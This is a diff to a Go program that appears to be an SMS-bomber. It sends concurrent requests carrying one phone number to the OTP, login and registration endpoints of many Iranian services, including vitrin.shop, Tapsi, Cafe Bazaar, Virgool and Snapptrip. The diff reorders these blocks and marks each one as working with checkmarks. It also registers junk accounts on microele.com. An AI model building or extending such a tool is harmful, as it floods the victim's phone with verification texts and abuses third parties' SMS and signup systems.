@@ -1533,7 +1533,7 @@ cookieJar, _ := cookiejar.New(nil)
 			}
 		}(client) 
 
-		// tandori.ir (JSON)
+		// tandori.ir (JSON) ✅ 
 		wg.Add(1)
 		tasks <- func(c *http.Client) func() { 
 			return func() {
@@ -1542,6 +1542,122 @@ cookieJar, _ := cookiejar.New(nil)
 				}, &wg, ch)
 			}
 		}(client)
+
+		// vitrin.shop ✅ 
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() {
+			return func() {
+				payload := map[string]interface{}{
+					"phone_number": phone, 
+					"forgot_password": false, 
+				}
+				sendJSONRequest(c, ctx, "https://www.vitrin.shop/api/v1/user/request_code", payload, &wg, ch)
+			}
+		}(client)
+		// titomarket.com ✅ 
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() {
+			return func() {
+				formData := url.Values{}
+				formData.Set("route", "extension/websky_otp/module/websky_otp.send_code") 
+				formData.Set("emailsend", "0") 
+				formData.Set("telephone", phone) 
+				sendFormRequest(c, ctx, "https://titomarket.com/fa-ir/index.php?route=extension/websky_otp/module/websky_otp.send_code&emailsend=0", formData, &wg, ch)
+			}
+		}(client) 
+
+	        //(Tapsi) - POST JSON ✅ 
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() {
+			return func() {
+				payload := map[string]interface{}{
+					"credential": map[string]interface{}{
+						"phoneNumber": phone, 
+						"role":        "PASSENGER",
+					},
+				}
+				sendJSONRequest(c, ctx, "https://tap33.me/api/v2/user", payload, &wg, ch)
+			}
+		}(client)
+// az in 2 ta yekish...
+		// virgool.io (JSON)  ✅ 
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() { 
+			return func() {
+				sendJSONRequest(c, ctx, "https://virgool.io/api/v1.4/auth/user-existence", map[string]interface{}{ 
+					"username": phone,
+				}, &wg, ch)
+			}
+		}(client)
+
+		// virgool.io (JSON) ✅ 
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() { 
+			return func() {
+				sendJSONRequest(c, ctx, "https://virgool.io/api/v1.4/auth/verify", map[string]interface{}{ 
+					"identifier": phone,
+				}, &wg, ch)
+			}
+		}(client)
+
+		// platform-api.snapptrip.com  ✅ 
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() { 
+			return func() {
+				sendJSONRequest(c, ctx, "https://platform-api.snapptrip.com/profile/auth/request-otp", map[string]interface{}{
+					"phoneNumber": phone,
+				}, &wg, ch)
+			}
+		}(client) 
+
+		// api.cafebazaar.ir (POST JSON) ✅ 
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() { 
+			return func() {
+				payload := map[string]interface{}{
+					"properties": map[string]interface{}{
+						"language":      2,
+						"clientID":      "56uuqlpkg8ac0obfqk09jtoylc7grssx",
+						"clientVersion": "web",
+						"deviceID":      "56uuqlpkg8ac0obfqk09jtoylc7grssx",
+					},
+					"singleRequest": map[string]interface{}{
+						"getOtpTokenRequest": map[string]interface{}{
+							"username": getPhoneNumber98NoZero(phone),
+						},
+					},
+				}
+				sendJSONRequest(c, ctx, "https://api.cafebazaar.ir/rest-v1/process/GetOtpTokenRequest", payload, &wg, ch) 
+			}
+		}(client) 
+
+		// https://www.irantic.com/api/login/authenticate (JSON) ✅ 
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() { 
+			return func() {
+				sendJSONRequest(c, ctx, "https://www.irantic.com/api/login/authenticate", map[string]interface{}{ 
+					"mobile": phone,
+				}, &wg, ch)
+			}
+		}(client) 
+
+		// microele.com (Registration - POST Form) ✅ 
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() { 
+			return func() {
+				formData := url.Values{}
+				formData.Set("id_customer", "")
+				formData.Set("back", ",my-account")
+				formData.Set("firstname", "123")
+				formData.Set("lastname", "123")
+				formData.Set("password", "123456")
+				formData.Set("action", "register")
+				formData.Set("username", phone)
+				formData.Set("ajax", "1")
+				sendFormRequest(c, ctx, "https://www.microele.com/login?back=my-account", formData, &wg, ch) // ارسال c
+			}
+		}(client) 
+
 
 		// pirankalaco.ir (OTP - POST Form)
 		wg.Add(1)
@@ -1564,42 +1680,6 @@ cookieJar, _ := cookiejar.New(nil)
 			}
 		}(client)
 
-		// vitrin.shop
-		wg.Add(1)
-		tasks <- func(c *http.Client) func() {
-			return func() {
-				payload := map[string]interface{}{
-					"phone_number": phone, 
-					"forgot_password": false, 
-				}
-				sendJSONRequest(c, ctx, "https://www.vitrin.shop/api/v1/user/request_code", payload, &wg, ch)
-			}
-		}(client)
-		// titomarket.com
-		wg.Add(1)
-		tasks <- func(c *http.Client) func() {
-			return func() {
-				formData := url.Values{}
-				formData.Set("route", "extension/websky_otp/module/websky_otp.send_code") 
-				formData.Set("emailsend", "0") 
-				formData.Set("telephone", phone) 
-				sendFormRequest(c, ctx, "https://titomarket.com/fa-ir/index.php?route=extension/websky_otp/module/websky_otp.send_code&emailsend=0", formData, &wg, ch)
-			}
-		}(client) 
-
-	        //(Tapsi) - POST JSON
-		wg.Add(1)
-		tasks <- func(c *http.Client) func() {
-			return func() {
-				payload := map[string]interface{}{
-					"credential": map[string]interface{}{
-						"phoneNumber": phone, 
-						"role":        "PASSENGER",
-					},
-				}
-				sendJSONRequest(c, ctx, "https://tap33.me/api/v2/user", payload, &wg, ch)
-			}
-		}(client)
 		//  toprayan.com 
 		wg.Add(1)
 		tasks <- func(c *http.Client) func() {
@@ -1752,26 +1832,6 @@ cookieJar, _ := cookiejar.New(nil)
 			}
 		}(client) 
 
-		// virgool.io (JSON) 
-		wg.Add(1)
-		tasks <- func(c *http.Client) func() { 
-			return func() {
-				sendJSONRequest(c, ctx, "https://virgool.io/api/v1.4/auth/user-existence", map[string]interface{}{ 
-					"username": phone,
-				}, &wg, ch)
-			}
-		}(client)
-
-		// virgool.io (JSON)
-		wg.Add(1)
-		tasks <- func(c *http.Client) func() { 
-			return func() {
-				sendJSONRequest(c, ctx, "https://virgool.io/api/v1.4/auth/verify", map[string]interface{}{ 
-					"identifier": phone,
-				}, &wg, ch)
-			}
-		}(client)
-
 		// Mobinnet (JSON)
 		wg.Add(1)
 		tasks <- func(c *http.Client) func() { 
@@ -1872,16 +1932,6 @@ cookieJar, _ := cookiejar.New(nil)
 			}
 		}(client)
 
-		// platform-api.snapptrip.com 
-		wg.Add(1)
-		tasks <- func(c *http.Client) func() { 
-			return func() {
-				sendJSONRequest(c, ctx, "https://platform-api.snapptrip.com/profile/auth/request-otp", map[string]interface{}{
-					"phoneNumber": phone,
-				}, &wg, ch)
-			}
-		}(client) 
-
 		// bigtoys.ir - Variation 3 (Form)
 		wg.Add(1)
 		tasks <- func(c *http.Client) func() { 
@@ -1931,37 +1981,6 @@ cookieJar, _ := cookiejar.New(nil)
 				formData.Set("json", "1")
 				formData.Set("whatsapp", "0")
 				sendFormRequest(c, ctx, "https://pgemshop.com/wp-admin/admin-ajax.php", formData, &wg, ch) 
-			}
-		}(client) 
-
-		// api.cafebazaar.ir (POST JSON)
-		wg.Add(1)
-		tasks <- func(c *http.Client) func() { 
-			return func() {
-				payload := map[string]interface{}{
-					"properties": map[string]interface{}{
-						"language":      2,
-						"clientID":      "56uuqlpkg8ac0obfqk09jtoylc7grssx",
-						"clientVersion": "web",
-						"deviceID":      "56uuqlpkg8ac0obfqk09jtoylc7grssx",
-					},
-					"singleRequest": map[string]interface{}{
-						"getOtpTokenRequest": map[string]interface{}{
-							"username": getPhoneNumber98NoZero(phone),
-						},
-					},
-				}
-				sendJSONRequest(c, ctx, "https://api.cafebazaar.ir/rest-v1/process/GetOtpTokenRequest", payload, &wg, ch) 
-			}
-		}(client) 
-
-		// https://www.irantic.com/api/login/authenticate (JSON)
-		wg.Add(1)
-		tasks <- func(c *http.Client) func() { 
-			return func() {
-				sendJSONRequest(c, ctx, "https://www.irantic.com/api/login/authenticate", map[string]interface{}{ 
-					"mobile": phone,
-				}, &wg, ch)
 			}
 		}(client) 
 
@@ -2134,22 +2153,6 @@ cookieJar, _ := cookiejar.New(nil)
 			}
 		}(client) 
 
-		// microele.com (Registration - POST Form)
-		wg.Add(1)
-		tasks <- func(c *http.Client) func() { 
-			return func() {
-				formData := url.Values{}
-				formData.Set("id_customer", "")
-				formData.Set("back", ",my-account")
-				formData.Set("firstname", "123")
-				formData.Set("lastname", "123")
-				formData.Set("password", "123456")
-				formData.Set("action", "register")
-				formData.Set("username", phone)
-				formData.Set("ajax", "1")
-				sendFormRequest(c, ctx, "https://www.microele.com/login?back=my-account", formData, &wg, ch) // ارسال c
-			}
-		}(client) 
 		// api.123kif.com Register (Registration/OTP - POST JSON)
 		wg.Add(1)
 		tasks <- func(c *http.Client) func() {
